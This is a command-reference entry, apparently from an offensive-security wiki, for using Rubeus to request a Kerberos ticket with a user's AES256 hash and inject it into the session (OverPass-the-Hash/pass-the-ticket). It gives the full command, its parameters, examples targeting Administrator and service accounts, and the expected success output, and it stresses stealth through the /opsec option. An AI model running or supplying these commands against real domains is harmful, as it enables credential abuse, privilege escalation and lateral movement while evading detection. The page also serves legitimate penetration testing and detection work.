---
id: 4df93cfb-05d7-4f76-8ffb-30900605f20a
name: rubeus-asktgt-request-tgt-with-aes256-hash
type: command
executor: cmd
data: '.\Rubeus.exe asktgt /user:$_USERNAME /aes256:$_AES256_HASH /opsec /ptt'
output: null
created_at: '2023-04-06T03:56:05.155175+00:00'
updated_at: '2023-04-10T20:26:24.177808+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - pass-the-hash
verified: true
validated: true
---

# rubeus-asktgt-request-tgt-with-aes256-hash

## Command

```cmd
.\Rubeus.exe asktgt /user:$_USERNAME /aes256:$_AES256_HASH /opsec /ptt
```

## Description

This command requests a Kerberos TGT using the user's AES256 hash, applies operational security measures (/opsec) to randomize behaviors, and injects the ticket into the current session (/ptt). It provides a stealthier alternative to RC4-based OverPass-the-Hash for domains enforcing stronger encryption.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /user:$_USERNAME | Target domain username (e.g., Administrator) | Yes |
| /aes256:$_AES256_HASH | AES256 hash in hex format (64 characters) | Yes |
| /opsec | Enables stealth mode with randomized keys and timings | Yes |
| /ptt | Pass-the-ticket: Injects the TGT into the current session | Yes |
| /domain:$_DOMAIN | Optional: Specify domain if not current | No |

## Examples

### Basic Usage

```cmd
.\Rubeus.exe asktgt /user:Administrator /aes256:$_AES256_HASH /opsec /ptt
```

### Advanced Usage

```cmd
.\Rubeus.exe asktgt /user:svc-account /aes256:$_AES256_HASH /opsec /ptt /domain:corp.local
```

## Expected Output

Successful execution shows:

```
[*] Action: Ask TGT
[+] Using AES256 with opsec enabled
[+] Requesting TGT for user 'CORP\Administrator'...
[+] Received a valid TGT from the KDC
[+] Tickets successfully injected into memory
[+] Action success!
```

Check with `klist` for the ticket. AES mismatches may cause KRB-ERROR (KDC_ERR_ETYPE_NOSUPP).

## Related

- [[procedures/OverPass-the-Hash-with-Rubeus]]
- [[tools/Rubeus]]
